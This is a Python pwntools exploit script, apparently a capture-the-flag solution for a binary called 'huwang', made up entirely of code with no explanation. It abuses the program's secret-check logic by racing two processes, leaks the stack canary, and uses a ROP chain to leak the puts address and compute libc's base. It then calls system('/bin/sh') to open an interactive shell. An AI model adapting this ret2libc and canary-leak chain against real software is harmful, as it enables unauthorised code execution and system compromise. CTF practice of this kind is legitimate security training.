from pwn import *
import hashlib
context.log_level = 'debug'

p = process('./huwang')
elf = ELF('./huwang')
libc = ELF('./libc-2.23.so')
rop=ROP(elf)

payload = 'a'*25
p.sendlineafter('>>','666')
p.sendafter('name',payload)
p.sendlineafter('?','y')
p.sendlineafter(':','-1')
p2 = process('./huwang')
p2.sendlineafter('>>','666')
p2.sendafter('name',payload)
p2.sendlineafter('?','y')
p2.sendlineafter(':','1')
tmp='\x00'*16
tmp = hashlib.md5(tmp).hexdigest().decode('hex')
p2.sendafter('secret',tmp)
p.close()
		
p2.recvuntil(payload)
canary = '\x00'+p2.recv(7)
p2.sendafter('?','a'*255)
p2.sendlineafter('N','Y')

print(rop.rdi)
pop_rdi=rop.rdi[0]

payload = 'a'*264+canary+'b'*8
payload+=p64(pop_rdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])
payload+=p64(pop_rdi)+p64(elf.got['puts'])+p64(0x40101C)
p2.send(payload)
p2.recvuntil('aaa\n')

lbase = u64(p2.recvuntil('\n')[:-1].ljust(8,'\x00'))-libc.sym['puts']
system = lbase+libc.sym['system']
binsh = lbase+libc.search('/bin/sh').next()

p2.sendafter('?','a'*255)
p2.sendlineafter('N','Y')
payload = 'a'*264+canary+'b'*8
payload+=p64(pop_rdi)+p64(binsh)+p64(system)
p2.send(payload)

p2.interactive()
